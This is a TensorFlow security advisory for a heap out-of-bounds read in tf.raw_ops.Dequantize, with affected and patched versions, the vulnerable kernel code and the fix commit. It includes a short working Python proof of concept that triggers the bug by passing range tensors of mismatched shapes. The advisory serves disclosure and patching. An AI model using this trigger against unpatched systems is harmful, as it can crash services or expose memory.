# Heap OOB read in `tf.raw\_ops.Dequantize`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-c45w-2wxr-pp53
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

Due to lack of validation in `tf.raw_ops.Dequantize`, an attacker can trigger a read from outside of bounds of heap allocated data:

```
import tensorflow as tf

input_tensor=tf.constant(
  [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)
input_tensor=tf.cast(input_tensor, dtype=tf.quint8)
min_range = tf.constant([-10], shape=[1], dtype=tf.float32)
max_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)

tf.raw_ops.Dequantize(
  input=input_tensor, min_range=min_range, max_range=max_range, mode='SCALED',
  narrow_range=True, axis=0, dtype=tf.dtypes.float32)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/26003593aa94b1742f34dc22ce88a1e17776a67d/tensorflow/core/kernels/dequantize_op.cc#L106-L131) accesses the `min_range` and `max_range` tensors in parallel but fails to check that they have the same shape:

```
if (num_slices == 1) {
  const float min_range = input_min_tensor.flat<float>()(0);
  const float max_range = input_max_tensor.flat<float>()(0);
  DequantizeTensor(ctx, input, min_range, max_range, &float_output);
} else {
  ...
  auto min_ranges = input_min_tensor.vec<float>();
  auto max_ranges = input_max_tensor.vec<float>();
  for (int i = 0; i < num_slices; ++i) {
    DequantizeSlice(ctx->eigen_device<Device>(), ctx,
                    input_tensor.template chip<1>(i), min_ranges(i),
                    max_ranges(i), output_tensor.template chip<1>(i));
    ...
  }
}
```
### Patches

We have patched the issue in GitHub commit [5899741d0421391ca878da47907b1452f06aaf1b](https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
